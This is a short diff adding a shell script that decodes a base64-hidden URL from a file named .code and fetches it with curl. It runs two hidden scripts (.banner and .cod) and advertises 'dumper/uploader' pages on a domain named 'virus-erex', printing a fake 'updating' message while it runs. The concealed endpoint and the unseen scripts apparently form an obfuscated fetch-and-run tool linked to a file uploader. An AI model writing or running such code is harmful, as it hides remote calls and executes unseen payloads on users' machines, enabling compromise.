@@ -1,0 +1,11 @@
+web=$(base64 -d .code)
+bash .banner
+echo "Version PHP 1.7.9 date on day"
+echo "Url share https://virus-erex.webcindario.com/dumper/uploader.html"
+echo "or https://virus-erex.webcindario.com/dumper/uploader.php"
+echo "Press to Ctrl + Z to quit."
+echo ""
+curl $web
+echo ""
+ping -i 10 -c 2 localhost | echo "Actualizando!!"
+bash .cod
